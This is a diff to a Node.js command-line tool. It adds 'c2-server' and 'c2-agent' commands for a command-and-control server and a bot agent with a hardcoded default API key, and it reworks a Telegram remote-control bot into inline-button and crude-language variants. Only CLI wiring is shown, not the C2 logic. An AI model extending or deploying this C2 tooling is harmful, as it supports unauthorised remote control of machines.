@@ -484,11 +484,49 @@ program
         await startWebServer(parseInt(options.port));
     });
 
-// Telegram command
+// C2 Server command
+program
+    .command('c2-server')
+    .description('🎯 Start C2 Command & Control server')
+    .option('-p, --port <number>', 'Server port', '8080')
+    .option('--host <host>', 'Server host', '0.0.0.0')
+    .option('--api-key <key>', 'API key for authentication', 'aryzz-c2-api-key-2024')
+    .action(async (options) => {
+        const { startC2Server } = await import('./src/c2/server.js');
+        await startC2Server({
+            port: parseInt(options.port),
+            host: options.host,
+            apiKey: options.apiKey
+        });
+    });
+
+// C2 Agent command
+program
+    .command('c2-agent')
+    .description('🤖 Start C2 bot agent')
+    .option('--c2-url <url>', 'C2 server URL', 'http://localhost:8080')
+    .option('--api-key <key>', 'API key for authentication', 'aryzz-c2-api-key-2024')
+    .action(async (options) => {
+        const { startC2Agent } = await import('./src/c2/agent.js');
+        await startC2Agent({
+            c2Url: options.c2Url,
+            apiKey: options.apiKey
+        });
+
+        // Handle graceful shutdown
+        process.on('SIGINT', () => {
+            logger.warning('\n⚠️  Shutting down agent...');
+            process.exit(0);
+        });
+    });
+
+// Telegram command (Versi Inline Buttons)
 program
     .command('telegram')
-    .description('Start Telegram bot for remote control')
-    .action(async () => {
+    .description('🔥 Start Telegram bot - Versi Button!')
+    .option('--inline', 'Use inline button version (default)', true)
+    .option('--kasar', 'Use command version with kasar language', false)
+    .action(async (options) => {
         if (!config.telegram || !config.telegram.bot_token || !config.telegram.admin_ids || config.telegram.admin_ids.length === 0) {
             logger.error('❌ Telegram configuration not found in config.json');
             logger.info('💡 Please add telegram configuration to config.json:');
@@ -519,9 +557,18 @@ program
         logger.info('🔧 Loading Telegram bot configuration...');
         logger.info(`👤 Authorized Admin IDs: ${config.telegram.admin_ids.join(', ')}`);
 
-        const { TelegramBot } = await import('./src/telegram/bot.js');
-        const bot = new TelegramBot(token, adminId, config);
-        bot.launch();
+        // Use inline button version by default
+        if (options.kasar) {
+            // Command version with kasar language
+            const { TelegramBotKasar } = await import('./src/telegram/bot-kasar.js');
+            const bot = new TelegramBotKasar(token, config.telegram.admin_ids, config);
+            bot.launch();
+        } else {
+            // Inline button version (default)
+            const { TelegramBotInline } = await import('./src/telegram/bot-inline.js');
+            const bot = new TelegramBotInline(token, config.telegram.admin_ids, config);
+            bot.launch();
+        }
     });
 
 // Parse arguments
